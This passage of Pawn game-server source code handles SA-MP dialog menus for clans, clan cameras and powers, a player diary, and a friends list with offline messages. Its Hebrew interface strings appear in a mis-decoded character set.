							case 2: // reset material
							{
								for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++) ResetSObjectMaterial(claninfo[playerinfo[playerid][clan]][cobject][i]);
								ClanDialog(playerid,clan_not,@c(green) ".рщЇё· р· ЎсЄэ ∙ь фрхсщщўшщэ",clan_hqcontrol);
								format(string,sizeof(string)," * рщЇё р· ЎсЄщ фрхсщщўшщэ сюЇўуф %s",GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
							}
						}
					}
					case clan_effects:
					{
						if(!HasClanPermission(playerid,clanperm_hqcontrol)) return 1;
						for(new i = 0, o = -1, Float:p[6], Float:sp; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++)
						{
							o = claninfo[playerinfo[playerid][clan]][cobject][i];
							GetSObjectPos(o,p[0],p[1],p[2]);
							GetSObjectRot(o,p[3],p[4],p[5]);
							switch(listitem)
							{
								case 0: AddSObjectPath(o,p[0],p[1],p[2],sp = 4.0,p[3],p[4],0-360.0);
								case 1: AddSObjectPath(o,p[0],p[1],p[2],sp = 10.0,p[3],p[4],0-360.0);
								case 2: AddSObjectPath(o,p[0],p[1],p[2]+10.0,sp = 7.0,p[3],180.0,p[5]);
								case 3:
								{
									AddSObjectPath(o,p[0],p[1],p[2]+50.0,sp = 25.0,p[3],p[4],p[5]);
									AddSObjectPath(o,p[0],p[1],p[2]-50.0,sp,p[3],p[4],p[5]);
								}
							}
							AddSObjectPath(o,p[0],p[1],p[2],sp,p[3],p[4],p[5]);
						}
						ClanDialog(playerid,clan_not,@c(green) ".рщЇё· р· ЎсЄэ ∙ь фрхсщщўшщэ",clan_vcontrol);
						format(string,sizeof(string)," * рщЇё р· ЎсЄщ фрхсщщўшщэ сюЇўуф %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
					}
					case clan_settingspeed:
					{
						if(!HasClanPermission(playerid,clanperm_hqcontrol)) return 1;
						playerinfo[playerid][clickon] = -1;
						for(new i = 0, c = 0; i < claninfo[playerinfo[playerid][clan]][cobjects] && playerinfo[playerid][clickon] == -1; i++)
						{
							if(objectinfo[claninfo[playerinfo[playerid][clan]][cobject][i]][omoving][0])
							{
								if(listitem == c) playerinfo[playerid][clickon] = c;
								c++;
							}
						}
						ClanDialog(playerid,clan_setspeed,.paramint = (listitem+1));
					}
					case clan_setspeed:
					{
						if(!HasClanPermission(playerid,clanperm_hqcontrol)) return 1;
						if(!strlen(inputtext)) return ClanDialog(playerid,clan_err,".ьр фўу· юёЇ° юфщ°х·");
						new Float:s = float(strval(inputtext)), k[16], o = claninfo[playerinfo[playerid][clan]][cobject][playerinfo[playerid][clickon]];
						if(s < 1.0 || s > 10.0) return ClanDialog(playerid,clan_err,".фюфщ°х· Ў°щыф ьфщх· сщя 1 ь-10");
						format(k,sizeof(k),"Object%d",playerinfo[playerid][clickon]);
						objectinfo[o][omoveto][3] = s;
						format(string,sizeof(string),"%d,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.4f,%.1f",objectinfo[o][omodel],objectinfo[o][opos][0],objectinfo[o][opos][1],objectinfo[o][opos][2],objectinfo[o][orot][0],objectinfo[o][orot][1],objectinfo[o][orot][2],objectinfo[o][omoveto][0],objectinfo[o][omoveto][1],objectinfo[o][omoveto][2],s);
						fsetstring(f,k,string);
						format(string,sizeof(string),@c(green) ".юфщ°х· ф·цхцф ∙ь фрхсщщўш ф∙·Ё·ф ь-%d",floatround(s));
						ClanDialog(playerid,clan_not,string,clan_settingspeed);
						format(string,sizeof(string)," * ∙щЁф р· фюфщ°х· ∙ь рчу юфрхсщщўшщэ фццщэ сюЇўуф %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
					}
					case clan_usematerial:
					{
						if(!HasClanPermission(playerid,clanperm_hqcontrol)) return 1;
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cobjects]; i++) for(new j = 0; j < 5; j++) SetDynamicObjectMaterial(claninfo[playerinfo[playerid][clan]][cobject][i],j,ObjectMaterials[listitem][omModelID],ObjectMaterials[listitem][omTXD],ObjectMaterials[listitem][omTexture]);
						format(string,sizeof(string),@c(green) ".\"∙щЁщ· р· ю°ўэ фрхсщщўшщэ ь\"%s",ObjectMaterials[listitem][omName]);
						ClanDialog(playerid,clan_not,string,clan_usematerial);
						format(string,sizeof(string)," * \"∙щЁф р· ю°ўэ фрхсщщўшщэ сюЇўуф ь\"%s %s",ObjectMaterials[listitem][omName],GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
					}
					case clan_chat:
					{
						if(!HasClanPermission(playerid,clanperm_chat)) return 1;
						switch(listitem)
						{
							case 0: // lock chat
							{
								claninfo[playerinfo[playerid][clan]][cchatlock] = _:(!(bool:claninfo[playerinfo[playerid][clan]][cchatlock]));
								format(string,sizeof(string),@c(green) ".%s р· Ў'рш фўьря сфЎьчф",claninfo[playerinfo[playerid][clan]][cchatlock] ? ("Ї·ч·") : ("ЁЄь·"));
								ClanDialog(playerid,clan_not,string,clan_chat);
								format(string,sizeof(string)," * %s р· Ў'рш фўьря %s",claninfo[playerinfo[playerid][clan]][cchatlock] ? ("ЁЄь") : ("Ї·ч"),GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 1: // chat color
							{
								ClanDialog(playerid,clan_chatcolor);
							}
							case 2: // leader chat color
							{
								ClanDialog(playerid,clan_chatlcolor);
							}
							case 3: // reset chat color
							{
								new col = rgba2hex(getRed(0x00FFFFAA),getGreen(0x00FFFFAA),getBlue(0x00FFFFAA),255);
								claninfo[playerinfo[playerid][clan]][cchatcolor][0] = col, claninfo[playerinfo[playerid][clan]][cchatcolor][1] = col;
								fsetint(f,"ChatColor",col);
								fsetint(f,"ChatColorL",col);
								format(string,sizeof(string),"{%s}.∙щЁщ· р· ЎсЄ фы·щсф сЎ'рш фўьря ьЎсЄ ∙ь ффхуЄф фцх",HexStringOfColor(col));
								ClanDialog(playerid,clan_not,".фчц°· р· ЎсЄщ фы·щсф сЎ'рш фўьря ьЎсЄщэ фсёщёщщэ",clan_chat);
								format(string,sizeof(string)," * ∙щЁф р· ЎсЄ фы·щсф сЎ'рш фўьря ьЎсЄщэ фсёщёщщэ %s",GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								PlaySound(playerid,1057);
							}
							case 4: // share with allianced clans
							{
								claninfo[playerinfo[playerid][clan]][cchatpeace] = _:(!(bool:claninfo[playerinfo[playerid][clan]][cchatpeace]));
								format(string,sizeof(string),@c(green) ".Ў'рш фўьря юЄы∙щх %s Єэ ўьрЁщэ сс°щ·",claninfo[playerinfo[playerid][clan]][cchatpeace] ? ("щфщф ю∙х·є") : ("ьр щфщф ю∙х·є"));
								ClanDialog(playerid,clan_not,string,clan_chat);
								format(string,sizeof(string)," * фтущ° р· Ў'рш фўьря ы%s Єэ ўьрЁщэ сс°щ· %s",claninfo[playerinfo[playerid][clan]][cchatpeace] ? ("ю∙х·є") : ("ьр ю∙х·є"),GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								fsetint(f,"ChatWithPeace",claninfo[playerinfo[playerid][clan]][cchatpeace]);
								PlaySound(playerid,1057);
							}
						}
					}
					case clan_chatcolor:
					{
						new theColor = GetColorFromClanDialog(playerid,inputtext,clan_editcolor);
						assert theColor != 0;
						fsetint(f,"ChatColor",claninfo[playerinfo[playerid][clan]][cchatcolor][0] = theColor);
						format(string,sizeof(string),"{%s}.∙щЁщ· р· ЎсЄ фы·щсф сЎ'рш фўьря ьЎсЄ ∙ь ффхуЄф фцх",HexStringOfColor(theColor));
						ClanDialog(playerid,clan_not,string,clan_chat);
						format(string,sizeof(string)," * ∙щЁф р· ЎсЄ фы·щсф сЎ'рш фўьря %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_chatlcolor:
					{
						new theColor = GetColorFromClanDialog(playerid,inputtext,clan_editcolor);
						assert theColor != 0;
						fsetint(f,"ChatColorL",claninfo[playerinfo[playerid][clan]][cchatcolor][1] = theColor);
						format(string,sizeof(string),"{%s}.∙щЁщ· р· ЎсЄ фы·щсф сЎ'рш фўьря ььщу°щэ ьЎсЄ ∙ь ффхуЄф фцх",HexStringOfColor(theColor));
						ClanDialog(playerid,clan_not,string,clan_chat);
						format(string,sizeof(string)," * ∙щЁф р· ЎсЄ фы·щсф сЎ'рш фўьря ььщу°щэ %s",GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						PlaySound(playerid,1057);
					}
					case clan_powers:
					{
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_not,@c(white) ".ыхчх· фўьря Єхц°щэ ьфтя Єь фюЇўуф\n.сЄц°· 3 чс°щ ўьря ∙щЄюух ыхьэ цф ьщу цф сюўхэ рчу Ёщ·я ьфЇЄщь ыхч ўьря ∙°ы∙·э\n!ьрч° ∙Єхюущэ 3 рх щх·° чс°щ ўьря (ыюф ∙щх·° фыхч щх·° чцў) ьхчЎщэ с·Ї°щш цф Єь рчу фыхчх· хфхр щЇЄь",clan_powers);
							default:
							{
								new id = (playerinfo[playerid][clickon] = (listitem-1));
								ClanDialog(playerid,claninfo[playerinfo[playerid][clan]][cpowers][id] ? clan_usepower : clan_buypower);
							}
						}
					}
					case clan_buypower:
					{
						if(!HasClanPermission(playerid,clanperm_power)) return 1;
						new s = playerinfo[playerid][clickon];
						if(claninfo[playerinfo[playerid][clan]][cpowers][s]) ClanDialog(playerid,clan_usepower);
						else
						{
							if(GetMoney(playerid) < cupowers[s][CUPCost]) return ClanDialog(playerid,clan_err,".рщя ьъ юёЇщў ыёє ьўЁщщ· фыхч фцф",clan_buypower);
							GiveMoney(playerid,0-cupowers[s][CUPCost]);
							claninfo[playerinfo[playerid][clan]][cpowers][s] = true, claninfo[playerinfo[playerid][clan]][csystemparam][s] = ClanSystems[s][clsParam];
							format(string,sizeof(string),"Power%d",cupowers[s][CUPID]);
							fsetint(f,string,1);
							format(string,sizeof(string),@c(green) "!%s Єсх° фўьря %s ўЁщ· сфЎьчф с-$%d р· фыхч",claninfo[playerinfo[playerid][clan]][cname],cupowers[s][CUPName],cupowers[s][CUPCost]);
							ClanDialog(playerid,clan_not,string,clan_powers);
							format(string,sizeof(string)," * !с-$%d %s ўЁф ьўьря р· фыхч %s",cupowers[s][CUPCost],cupowers[s][CUPName],GetName(playerid));
							ClanNotification(playerinfo[playerid][clan],string);
						}
					}
					case clan_usepower:
					{
						if(!HasClanPermission(playerid,clanperm_power)) return 1;
						if(GetPlayerHQ(playerid) != playerinfo[playerid][clan]) return ClanDialog(playerid,clan_err,".Ёщ·я ьф∙·ю∙ сыхч фўьря °ў сюЇўуф",clan_usepower);
						if(claninfo[playerinfo[playerid][clan]][cusingpower]) return ClanDialog(playerid,clan_err,".фўьря ∙ьъ ыс° ю∙·ю∙ сыхч ы°тЄ, рЁр фю·я ∙ф∙ЇЄ·х ·ё·щщэ",clan_usepower);
						new id = playerinfo[playerid][clickon], ps = 0, p[MAX_PLAYERS], bool:hasenergy = true;
						for(new i = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++)
						{
							if(GetDistanceBetweenPlayers(playerid,claninfo[playerinfo[playerid][clan]][cplayers][i]) <= 10.0)
							{
								p[ps++] = claninfo[playerinfo[playerid][clan]][cplayers][i];
								if(playerinfo[claninfo[playerinfo[playerid][clan]][cplayers][i]][energy] < cupowers[id][CUPEnergy] && hasenergy) hasenergy = false;
							}
						}
						if(ps < 3) return ClanDialog(playerid,clan_err,".у°х∙щэ ьЇчх· 3 ю∙··Їщэ ьщЎщ°· фыхч, ∙щЄюух ыхьэ срх·х рцх°",clan_usepower);
						if(!hasenergy) return ClanDialog(playerid,clan_err,".ьр ыь фю∙··Їщэ сыхч ючцщўщэ сыюх· фрЁ°тщф фу°х∙ф ь∙щюх∙ сыхч",clan_usepower);
						format(string,sizeof(string)," ...(ыхьь %d чс°щ ўьря) %s ю·чщь ьщЎх° ыхч ўьря рхьшщюшщсщ юёхт %s",ps,cupowers[id][CUPName],GetName(playerid));
						ClanNotification(playerinfo[playerid][clan],string);
						format(string,sizeof(string),@c(grey) ".Єьщъ ьчых· сюўхэ %d ∙Ёщх· ,%s р·ф ∙х·є сщЎщ°· ыхч фўьря",cupowers[id][CUPCD],cupowers[id][CUPName]);
						for(new i = 0; i < ps; i++) ShowPlayerDialog(p[i],dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "щЎщ°· ыхч ўьря",string,"OK","");
						SetTimerEx("UseClanUltimatePower",1000 * cupowers[id][CUPCD],0,"iii",playerid,id,ps);
						claninfo[playerinfo[playerid][clan]][cusingpower] = 1;
					}
					case clan_cameras: switch(listitem)
					{
						case 0: ClanDialog(playerid,clan_not,@c(white) ".юЎьюх· фрсшчф фя чьў ююЄ°ы· фрсшчф ∙ь фюЇўуф, хюрЇ∙°х· ЎЇщщф сф сыь °тЄ\n.Єь щущ фЁч· юЎьюф сюўхэ юёхщщэ ·хыь ьЎЇх· юрх·х юўхэ сюЇўуф хьфцщц р· фюЎьюф ьЁхчщх·ъ",clan_cameras);
						default:
						{
							new id = playerinfo[playerid][clickon] = (listitem-1);
							if(ccameras[playerinfo[playerid][clan]][id][camLevel] > 0) ClanDialog(playerid,clan_cameraselect,.paramint = id);
						}
					}
					case clan_cameraselect:
					{
						new camid = playerinfo[playerid][clickon];
						if(!ccameras[playerinfo[playerid][clan]][camid][camLevel]) return ClanDialog(playerid,clan_err,".юЎьюф цх ьр ўщщю· щх·°",clan_cameras);
						switch(listitem)
						{
							case 0: // view
							{
								TogglePlayerSpectating(playerid,1);
								AttachCameraToDynamicObject(playerid,ccameras[playerinfo[playerid][clan]][camid][camObject]);
								format(string,sizeof(string)," * ЎхЇф ыЄ· сюЎьюф юёЇ° %d %s",camid+1,GetName(playerid));
								ClanNotification(playerinfo[playerid][clan],string);
								if(ccameras[playerinfo[playerid][clan]][camid][camLevel] < 2) for(new i = 0; i < sizeof(badcamera); i++) TextDrawShowForPlayer(playerid,badcamera[i]);
								ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ЎЇщщф сюЎьюф",@c(green) ":р·ф ЎхЇф ыЄ· сюЎьюф\n\n" @c(yellow) "- фцц р· фЄыс° ыущ ьЎЇх· сюўхюх· рч°щэ\n- ыущ ьёщщэ ьЎЇх· сюЎьюф " @c(red) "/camoff" @c(yellow) " ьчї ыь юў∙ рх ф∙·ю∙ сЇўхуф","OK","");
								playerinfo[playerid][clancam] = camid;
							}
							case 1: // move
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								if(!claninfo[playerinfo[playerid][clan]][hashq]) return ClanDialog(playerid,clan_err,".ьўьря ∙ьъ рщя юЇўуф, ьр Ёщ·я ьўсхЄ ющўхэ юЎьюф");
								playerinfo[playerid][selectingpos][1] = 1, playerinfo[playerid][selectingpos][2] = clan_edit;
								format(string,sizeof(string),"юЎьюф #%d",camid);
								ClanDialog(playerid,clan_selectpos,string,clan_cameraselect);
							}
							case 2: // remove
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								ClanDialog(playerid,clan_cameraremove,.paramint = camid);
							}
							case 3: // upgrade
							{
								if(!HasClanPermission(playerid,clanperm_edit)) return 1;
								if(ccameras[playerinfo[playerid][clan]][camid][camLevel] == 2) return ClanDialog(playerid,clan_err,".юЎьюф цх ыс° ю∙ху°т·");
								ClanDialog(playerid,clan_cameraupgrade,.paramint = camid);
							}
						}
					}
					case clan_cameraremove:
					{
						if(!HasClanPermission(playerid,clanperm_edit)) return 1;
						new camid = playerinfo[playerid][clickon], key[32], key2[32];
						const LAST_ONE = MAX_CLAN_CAMERAS - 1;
						if(!ccameras[playerinfo[playerid][clan]][camid][camLevel]) return ClanDialog(playerid,clan_err,".юЎьюф цх ьр ўщщю· щх·°",clan_cameras);
						DestroySObject(ccameras[playerinfo[playerid][clan]][camid][camObject]);
						for(new i = camid; i < LAST_ONE; i++)
						{
							for(new j = 0; j < 3; j++) ccameras[playerinfo[playerid][clan]][i][camPos][j] = ccameras[playerinfo[playerid][clan]][i+1][camPos][j];
							ccameras[playerinfo[playerid][clan]][i][camLevel] = ccameras[playerinfo[playerid][clan]][i+1][camLevel], ccameras[playerinfo[playerid][clan]][i][camObject] = ccameras[playerinfo[playerid][clan]][i+1][camObject];
							format(key,sizeof(key),"Camera%dPos",i);
							format(key2,sizeof(key2),"Camera%dPos",i+1);
							fsetstring(f,key,fgetstring(f,key2));
							format(key,sizeof(key),"Camera%d",i);
							format(key2,sizeof(key2),"Camera%d",i+1);
							fsetint(f,key,fgetint(f,key2));
						}
						if(ccameras[playerinfo[playerid][clan]][LAST_ONE][camLevel] > 0)
						{
							for(new j = 0; j < 3; j++) ccameras[playerinfo[playerid][clan]][LAST_ONE][camPos][j] = 0.0;
							ccameras[playerinfo[playerid][clan]][LAST_ONE][camLevel] = 0, ccameras[playerinfo[playerid][clan]][LAST_ONE][camObject] = INVALID_OBJECT_ID;
							format(key,sizeof(key),"Camera%dPos",LAST_ONE);
							fremovekey(f,key);
							format(key,sizeof(key),"Camera%d",LAST_ONE);
							fremovekey(f,key);
						}
					}
				}
			}
			else ClanDialog(playerid,playerinfo[playerid][cclick][1],playerinfo[playerid][cclickparam],playerinfo[playerid][cclickparamint]);
			#undef securedSelect
		}
		case dialog_clanclose: if(response) command(playerid,"/clan");
		case dialog_claninvite:
		{
	 		if(!(playerinfo[playerid][iclan] > 0 && playerinfo[playerid][clan] == 0 && playerinfo[playerid][gang] == 0)) return SendClientMessage(playerid,red," .ьр фщф Ёщ·я ьЄЁх· ьфцюЁф цх");
			if(response)
			{
				claninfo[playerinfo[playerid][iclan]][cplayers][claninfo[playerinfo[playerid][iclan]][cmembers]] = playerid;
				format(string,sizeof(string)," * фЎш°є ьўьря ∙ьъ %s",GetName(playerid));
				ClanNotification(playerinfo[playerid][iclan],string);
				claninfo[playerinfo[playerid][iclan]][cmembers]++;
				playerinfo[playerid][clan] = playerinfo[playerid][iclan];
				CloseClanMenu(playerinfo[playerid][clan],"чс° ўьря чу∙ фЎш°є",true);
				ClanPList_Add(playerinfo[playerid][clan],playerid);
				playerinfo[playerid][lclan] = 1;
				SetPlayerColor(playerid,rgba2hex(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],PLAYER_ALPHA));
				playerinfo[playerid][iclan] = 0;
				playerinfo[playerid][lastrec] = 0;
				if(playerinfo[playerid][logged]) fsetstring(fuser(playerid),"ClanCode",clancode(playerinfo[playerid][clan]));
				new rules = 0;
				format(string,sizeof(string),"{%s}!%s фЎш°Ї· ьўьря",ClanHexColor(playerinfo[playerid][clan]),claninfo[playerinfo[playerid][clan]][cname]);
				for(new i = 0; i < sizeof(crules[]); i++)
				{
					if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
					rules++;
				}
				if(rules > 1)
				{
					new joinDialog[450];
					format(joinDialog,sizeof(joinDialog),"%s\n\n\n:∙щэ ьс ьчхўщ фўьря\n\n",string);
					for(new i = 0; i < sizeof(crules[]); i++)
					{
						if(strlen(crules[playerinfo[playerid][clan]][i]) <= 1) continue;
						format(joinDialog,sizeof(joinDialog),"%s\n Х %02d. %s",joinDialog,i+1,crules[playerinfo[playerid][clan]][i]);
					}
					ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьўьря",joinDialog,"OK","");
				}
				else ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьўьря",string,"OK","");
			}
			else
			{
				format(string,sizeof(string)," * учф р· ффцюЁф ьфЎш°Їх· ьўьря ∙ьъ %s",GetName(playerid));
				ClanNotification(playerinfo[playerid][iclan],string);
				format(string,sizeof(string),"{%s}.%s учщ· р· ффцюЁф ьфЎш°Їх· ьўьря",ClanHexColor(playerinfo[playerid][iclan]),claninfo[playerinfo[playerid][iclan]][cname]);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьўьря",string,"OK","");
				playerinfo[playerid][iclan] = 0;
			}
		}
		case dialog_objectives: if(response)
		{
			new dia[300];
			format(dia,sizeof(dia),@c(white) "%s",Objectives[listitem][obText]);
			if(playerinfo[playerid][objective][listitem]) format(dia,sizeof(dia),"%s\n\n" @c(green) ".ф∙ью· р· фр·т° фцф",dia);
			else format(dia,sizeof(dia),"%s\n\n" @c(red) ".Єущщя ьр ф∙ью· р· фр·т° фцф",dia);
			format(string,sizeof(string),@c(lightblue) "юш°· фр·т°: %s",Objectives[listitem][obName]);
			ShowPlayerDialog(playerid,dialog_objective,DIALOG_STYLE_MSGBOX,string,dia,"чцх°","ётх°");
		}
		case dialog_objective: if(response) command(playerid,"/objectives");
		case dialog_diary: if(response)
		{
			playerinfo[playerid][clickon] = listitem + 1;
			format(string,sizeof(string),@c(grey) ":°∙хэ ыря р· фшўёш ∙р·ф юЄхЁщщя ь°∙хэ с∙х°ф %d, ф∙р° °щў ыущ ьючхў",listitem + 1);
			ShowPlayerDialog(playerid,dialog_diaryinput,DIALOG_STYLE_INPUT,@c(lightblue) "Є°щы· ∙х°ф сщхюя",string,"∙ющ°ф","сщшхь");
		}
		case dialog_diaryinput:
		{
			if(response)
			{
				if(strlen(inputtext) > 90) return ShowPlayerDialog(playerid,dialog_diaryinput,DIALOG_STYLE_INPUT,@c(lightblue) "Є°щы· ∙х°ф сщхюя",@c(red) ":Ёщ·я ь°∙хэ °ў Єу 90 ·хщэ с∙х°ф. Ёр ьфўьщу ючу∙ р· фшўёш Єэ Їчх· ·хщэ","∙ющ°ф","сщшхь");
				format(string,sizeof(string),"DiaryLine%d",playerinfo[playerid][clickon]);
				if(!strlen(inputtext))
				{
					SetPVarString(playerid,string,"None");
					fsetstring(fuser(playerid),string,"None");
					format(string,sizeof(string)," !ючў· сфЎьчф р· ∙х°ф %d сщхюя ∙ьъ",playerinfo[playerid][clickon]);
				}
				else
				{
					SetPVarString(playerid,string,inputtext);
					fsetstring(fuser(playerid),string,inputtext);
					format(string,sizeof(string)," !Є°ы· сфЎьчф р· ∙х°ф %d сщхюя ∙ьъ",playerinfo[playerid][clickon]);
				}
				SendClientMessage(playerid,green,string);
				PlaySound(playerid,1057);
			}
			ShowPlayerConstDialog(playerid,dialog_diary);
		}
		case dialog_friends: if(response)
		{
			if(!listitem) ShowPlayerDialog(playerid,dialog_friendsadd,DIALOG_STYLE_INPUT,@c(lightblue) "фхёЇ· чс°",@c(grey) ":фыщЁхщ рх чьў юфыщЁхщ ∙ь ф∙чўя ∙р·ф °хЎф ьфхёщє ьчс°щэ ,ID-фўьу ыря р· ф","∙ьч сў∙ф","чцх°");
			else
			{
				listitem--;
				new fnum = 0;
				for(new i = 1; i <= MAX_FRIENDS; i++)
				{
					format(string,sizeof(string),"Friend_%d",i);
					GetPVarString(playerid,string,string,sizeof(string));
					if(!equal(string,"None")) if(++fnum == (listitem+1))
					{
						fnum = i;
						break;
					}
				}
				playerinfo[playerid][friendclick] = fnum;
				ShowPlayerConstDialog(playerid,dialog_friendsopt);
			}
		}
		case dialog_friendsopt:
		{
			if(response)
			{
				format(string,sizeof(string),"Friend_%d",playerinfo[playerid][friendclick]);
				GetPVarString(playerid,string,string,sizeof(string));
				new id = GetExactID(string);
				switch(listitem)
				{
					case 0: // remove
					{
						format(string,sizeof(string),@c(grey) "?ю°∙щю· фчс°щэ ∙ьъ %s фрэ р·ф сшхч ∙с°ЎхЁъ ьючхў р·\n.·хыь ьфчцщ° рх·х °ў Єь щущ ∙ьщч· сў∙ф ЁхёЇ·\n\n" @c(white) "(рь ·урт, ю∙·ю∙щэ ьр юўсьщэ фхуЄф Єь цф ∙р·ф юхчў рх·э юфчс°щэ)",string);
						ShowPlayerDialog(playerid,dialog_friendsremove,DIALOG_STYLE_MSGBOX,@c(lightblue) "ючщў· чс°",string,"ючў","чцх°");
					}
					case 1: // chat
					{
						if(!IsPlayerConnected(id)) return ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".фю∙·ю∙ Ў°щъ ьфщх· ючхс° ь∙°· ыущ ∙·хыь ьфцющя рх·х ьЎ'рш","чцх°", "");
						if(!playerinfo[playerid][inchat]) return ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщЁъ ЁюЎр с∙хэ Ў'рш","чцх°", "");
						if(chatinfo[playerid][chatManager] != playerid) return ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".рщЁъ юЁфь р· фЎ'рш ∙р·ф ЁюЎр сх","чцх°", "");
						if(playerinfo[id][inchat]) return ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".чс° цф ыс° ЁюЎр сЎ'рш рч°","чцх°", "");
						format(string,sizeof(string),"%s-Ё∙ьчф фцюЁф ьфЎш°Їх· ьЎ'рш ь",GetName(id));
						Chat_Write(playerinfo[playerid][inchat],string);
						format(string,sizeof(string),@c(green) "/chatinvite - :юцющя рх·ъ ьфЎш°є ьЎ'рш %s\n%s",GetName(playerid),chatinfo[playerinfo[playerid][inchat]][chatTitle]);
						SendClientMessage(id,green,string);
						playerinfo[id][chatinvite] = playerinfo[playerid][inchat];
					}
					case 2: // offline message
					{
						if(IsPlayerConnected(id)) return ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "сЄщф",@c(red) ".Ёщ·я ьф∙рщ° фхуЄф °ў ьчс° ∙юЁх·ў юф∙°·. фхр щ°рф р· ффхуЄф ы∙фхр щ·чс°","чцх°","ётх°");
						ShowPlayerConstDialog(playerid,dialog_friendsmsg);
					}
				}
			}
			else ShowPlayerConstDialog(playerid,dialog_friends);
		}
		case dialog_friendsmsg: if(response)
		{
		    if(!inputtext[0]) ShowPlayerConstDialog(playerid, dialog_friendsmsg, 1);
			if(strlen(inputtext) > 100) ShowPlayerConstDialog(playerid, dialog_friendsmsg, 2);
			format(string,sizeof(string),"Friend_%d",playerinfo[playerid][friendclick]);
			SaveData("message", playerid, fgetstring(fuser(playerid), string), inputtext);
			ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightgreen) "ффхуЄф Ё∙ьчф",@c(green) ".ффхуЄф Ё∙ьчф сфЎьчф","чцх°", "");
		}
		case dialog_friendsopte: if(response) ShowPlayerConstDialog(playerid,playerinfo[playerid][friendclick] == -1 ? dialog_friends : dialog_friendsopt);
		case dialog_friendsremove:
		{
			if(response)
			{
				new hisName[MAX_PLAYER_NAME], hisFile[64], hisID = INVALID_PLAYER_ID;
				format(string,sizeof(string),"Friend_%d",playerinfo[playerid][friendclick]);
				GetPVarString(playerid,string,hisName,sizeof(hisName));
				fsetstring(fuser(playerid),string,"None");
				SetPVarString(playerid,string,"None");
				playerinfo[playerid][friendclick] = -1, playerinfo[playerid][friends]--;
				hisID = GetExactID(hisName);
				if(IsPlayerConnected(hisID))
				{
					playerinfo[hisID][friends]--;
					if(playerinfo[hisID][indialog] == dialog_friends || playerinfo[hisID][indialog] == dialog_friendsremove || playerinfo[hisID][indialog] == dialog_friendsopt)
					{
						playerinfo[hisID][friendclick] = -1;
						ShowPlayerConstDialog(hisID,dialog_friends);
					}
					format(hisFile,sizeof(hisFile),fuser(hisID));
				}
				else format(hisFile,sizeof(hisFile),"/DM/Users/%s.ini",hisName);
				for(new i = 1; i <= MAX_FRIENDS; i++)
				{
					format(string,sizeof(string),"Friend_%d",i);
					if(hisID == INVALID_PLAYER_ID) format(string,sizeof(string),fgetstring(hisFile,string));
					else GetPVarString(hisID,string,string,sizeof(string));
					if(equal(string,GetName(playerid)))
					{
						format(string,sizeof(string),"Friend_%d",i);
						fsetstring(hisFile,string,"None");
						if(hisID != INVALID_PLAYER_ID) SetPVarString(hisID,string,"None");
						break;
					}
				}
				Border(playerid,"updatefriends");
				if(hisID != INVALID_PLAYER_ID) Border(hisID,"updatefriends");
				PlaySound(playerid,1057);
				format(string,sizeof(string),@c(green) "!ю°∙щю· фчс°щэ ∙ьъ %s ючў· р·",hisName);
				ShowPlayerDialog(playerid,dialog_friendsopte,DIALOG_STYLE_MSGBOX,@c(lightblue) "ючщў· чс°",string,"чцх°","ётх°");
			}
			else ShowPlayerConstDialog(playerid,dialog_friendsopt);
		}
		case dialog_friendsadd:
		{
			if(response)
			{
				if(!playerinfo[playerid][invitetime][0]) return ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",@c(red) ".ыс° ∙ьч· фцюЁх· ьрч°хЁф. Ёёф ∙хс юрхч° щх·°","чцх°","ётх°");
				if(playerinfo[playerid][friends] >= MAX_FRIENDS) return ShowPlayerDialog(playerid,dialog_friendsadde,DIALOG_STYLE_MSGBOX,@c(lightblue) "фхёЇ· чс°",@c(red) ".°∙щю· фчс°щэ ∙ьъ юьрф, Ёщ·я ьфхёщє Єу " #MAX_FRIENDS " чс°щэ","чцх°","ётх°");
